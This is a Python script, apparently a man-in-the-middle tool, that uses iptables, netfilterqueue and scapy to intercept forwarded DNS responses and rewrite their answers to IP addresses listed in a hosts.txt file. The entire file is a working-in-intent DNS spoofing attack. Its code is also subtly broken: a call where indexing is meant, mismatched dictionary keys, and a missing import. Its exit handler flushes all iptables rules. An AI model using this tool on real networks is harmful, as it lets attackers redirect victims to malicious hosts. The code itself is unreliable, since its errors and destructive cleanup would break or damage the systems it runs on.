import sys

from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP
import os
import netfilterqueue

hosts_file = "./hosts.txt"
dns_hosts = {}


def get_host_list():
    try:
        with open(hosts_file) as file:
            for line in file:
                (key, val) = line.split(":")
                dns_hosts[int(key)] = val
    except FileNotFoundError:
        sys.exit("hosts.txt is not found in the current directory.")


def modify_packet(packet):
    """
    Modifies the DNS Resource Record 'packet' to map the host dictionary from hosts.txt.
    Whenever a key is seen in an answer, the real IP address of the domain is replaced with the value in the dictionary.
    :param packet: Incoming packet
    ;:return: Modified (spoofed) packet
    """
    # Get DNS question name
    qname = packet(DNSQR).qname
    if qname not in dns_hosts:
        # If the website isn't in the list of websites to spoof, skip it.
        print("No modification:", qname)
        return packet
    # Else, craft new, spoofed answer. Re-map websites to new IP addresses
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])

    # Set the answer count to 1
    packet[DNS].ancount = 1

    # Because we modified teh packet, we should purge the checksum and length of the original packet.
    # We need to create new checksum and length for our spoofed packet.
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    # Return the modified packet.
    return packet


def process_packet(packet):
    """
    This callback will be called everytime a new packet is redirected to the netfilter queue.
    :param packet: Incoming packet
    """
    # Convert a netfilter packet to a scapy packet.
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):  # If the packet is a DNS Resource Record, modify it
        print("[Before]: ", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After]: ", scapy_packet.summary())
        # Set the packet back to a netfilter packet
        packet.set_payload(bytes(scapy_packet))
    # Accept the packet
    packet.accept()


def dns_main():
    QUEUE_NUM = 0

    # Insert iptables rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

    # Instantiate netfilter queue
    queue = NetfilterQueue()

    try:
        # bind the queue number to our callback (process_packet)
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # If the user wants to quit, reverse the iptables rule
        os.system("iptables --flush")